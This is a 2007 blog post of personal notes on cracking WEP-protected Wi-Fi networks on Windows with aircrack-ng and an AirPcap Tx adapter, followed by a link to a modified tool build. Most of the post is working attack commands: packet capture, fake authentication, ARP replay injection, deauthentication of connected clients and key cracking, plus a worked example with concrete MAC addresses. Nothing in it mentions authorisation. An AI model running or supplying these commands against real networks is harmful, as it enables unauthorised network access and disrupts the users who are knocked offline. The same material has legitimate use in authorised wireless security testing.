---
id: 146
title: 'Notes: Cracking WEP on the Windows command line with Aircrack-ng and AirPcap Tx'
date: 2007-09-12T19:37:34+00:00
author: Phil Wiffen
excerpt: |
layout: post
guid: http://www.kabri.uk/2007/09/12/notes-cracking-wep-with-aircrack-ng-and-airpcap-tx/
permalink: /2007/09/12/notes-cracking-wep-with-aircrack-ng-and-airpcap-tx/
ratings_users:
  - "1"
  - "1"
  - "1"
  - "1"
  - "1"
ratings_score:
  - "5"
  - "5"
  - "5"
  - "5"
  - "5"
ratings_average:
  - "5"
  - "5"
  - "5"
  - "5"
  - "5"
aktt_notify_twitter:
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
  - 'no'
categories:
  - Networking
  - Security
  - Wi-Fi
  - Windows
tags:
  - aircrack-ng
  - airpcap
  - airpcap tx
  - cracking
  - wep
  - Windows
---
![ARP injection in Windows using AirPcap Tx](http://www.kabri.uk/wp-content/uploads/2007/09/airpcap-arp-injection.png)

Finally, I&#8217;ve had time to write down my notes on using aircrack-ng with the [Airpcap Tx adapter](http://www.crownhill.co.uk/product.php?prod=1779&ref=wireless-analysis) in Windows. Before you read on, please be aware that this isn&#8217;t meant to be a guide or tutorial, it&#8217;s **just my notes**. Thanky 🙂

### Basics

Start capturing:

`</p>
<pre>airodump-ng \\.\airpcap00 airpcap CHANNELNUMBER mycapturefile</pre>
<p>`

Fake auth:

`</p>
<pre>aireplay-ng --fakeauth 0 -e "MYSSID" -a BSSIDMAC -h AIRPCAPMAC \\.\airpcap00</pre>
<p>`

Start attack:

`</p>
<pre>aireplay-ng --arpreplay -b BSSIDMAC -h CLIENTMAC \\.\airpcap00</pre>
<p>`

Deauth (if we need ARPs):

<span style="font-family: 'Courier New'; line-height: 18px; white-space: pre;">aireplay-ng &#8211;deauth 3 -a BSSIDMAC -c CLIENTMAC \\.\airpcap00</span>

Start cracking:

`</p>
<pre>aircrack-ng -z mycapturefile.cap</pre>
<p>`

Worked example:

    airodump-ng.exe \\.\airpcap00 airpcap 11 mycapturefile
    aireplay-ng --fakeauth 0 -e "WEP" -a 00:a0:c5:9d:d5:50 -h 00:02:72:67:92:8a \\.\airpcap00
    aireplay-ng --arpreplay -b 00:a0:c5:9d:d5:50 -h 00:90:4b:eb:9b:36 \\.\airpcap00
    aireplay-ng --deauth 3 -a 00:a0:c5:9d:d5:50 -c 00:90:4b:eb:9b:36 \\.\airpcap00
    aircrack-ng -z mycapturefile.cap

### Download

I&#8217;ve prepared a special release of the aircrack-ng tools originally prepared by CACE Technologies on the AirPcap CDROM. It replaces the new aireplay-ng.exe with an older one which, in my tests, appears to perform better.  
[  
**Download the release of aircrack-ng for AirPcap Tx**](http://www.kabri.uk/wp-content/uploads/2007/09/aircrack-ng-09-twistedethicscom-edition.zip "aircrack-ng release 0.9")